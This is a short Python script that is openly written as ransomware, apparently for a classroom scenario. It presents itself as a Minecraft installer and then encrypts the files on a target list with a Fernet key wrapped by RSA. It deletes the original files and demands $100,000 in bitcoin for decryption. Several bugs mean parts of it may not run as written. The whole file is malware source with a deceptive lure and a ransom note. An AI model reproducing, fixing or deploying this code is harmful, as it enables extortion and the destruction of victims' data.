# Import modules
import os
import rsa
from cryptography.fernet import Fernet

def BooeyEncryption():

    # Given a public key (this can be created outside of the scenario)
    with open('bababooey.pub', 'rb') as publicKey:

        # Create a Random Symmetric Key in Memory (smem)
        smem = Fernet.generate_key()

        # Create an encrypted variant of smem on disk (smem-enc)
        smem_enc = rsa.encrypt(smem.encode(), publicKey)

        with open('smem-enc', 'wb') as f:
            f.write(smem_enc)

        # Either within your malware file or perhaps a configuration file, read a target list
        with open('target_list.txt', 'r') as f:
            targetList = [line.strip() for line in f]

        # For each file in your target list
        for filePath in targetList:

            # encrypt the file using smem, giving it a new extension, indicating it has been encrypted
            if os.path.isfile(filePath):
                fileDir, fileName = os.path.split(filePath)
                fileName, fileExt = os.path.splitext(fileName)
                encryptedFileName = fileName + '_enc' + fileExt
                encryptedFilePath = os.path.join(fileDir, encryptedFileName)

            # Read contents of original file
            with open(filePath, 'rb') as f:
                    fileData = f.read()

            # Encrypt the file contents
            f = Fernet(smem)
            encryptedData = f.encrypt(fileData)

            # Write the encrypted contents to the new file
            with open(encryptedFilePath, 'wb') as f:
                f.write(encryptedData)

            # Delete the original file
            os.remove(filePath)

        # Clear smem from memory
        smem = None

def BooeyDecryption():

    # Read the RSA private key from disk
    with open('bababooey.pem', 'rb') as f:
        privateKey = f.read()

    # Read the encrypted symmetric key from disk
    with open('smem-enc', 'rb') as f:
        smem_enc = f.read()

    # Decrypt the symmetric key
    smem = rsa.decrypt(smem_enc.encode(), privateKey)

    # Read the list of encrypted files from a directory
    encryptedFilesDir = input('Path to encrypted files:')
    encryptedFiles = os.listdir(encryptedFilesDir)

    # Decrypt each encrypted file
    for encryptedFileName in encryptedFiles:
        if encryptedFileName.endswith('_enc'): # only work on encrypted files
            encryptedFilePath = os.path.join(encryptedFilesDir, encryptedFileName)
            decryptedFilePath = os.path.join(encryptedFilesDir, encryptedFileName[:-4]) # remove the '_enc' extension
            
            # Read the encrypted file contents
            with open(encryptedFilePath, 'rb') as f:
                encryptedData = f.read()
            
            # Decrypt the file contents
            f = Fernet(smem)
            decryptedData = f.decrypt(encryptedData)
            
            # Write the decrypted contents to a new file
            with open(decryptedFilePath, 'wb') as f:
                f.write(decryptedData)
            
            # Delete the encrypted file
            os.remove(encryptedFilePath)

    # Clear the symmetric key from memory
    smem = None


gotcha = input('Install Minecraft? (y/n)')

if gotcha == 'y':
    BooeyEncryption()
else:
    print('goodbye')

print('Sike! Your files have been encrypted! Please send $100000 worth of BTC to bababooey@champlain.edu to obtain the decryption key')

paymentMade = input('Has payment been made? (y/n)')

if paymentMade == 'y':
    BooeyDecryption()
else:
    print('Sorry, no dice!')
    exit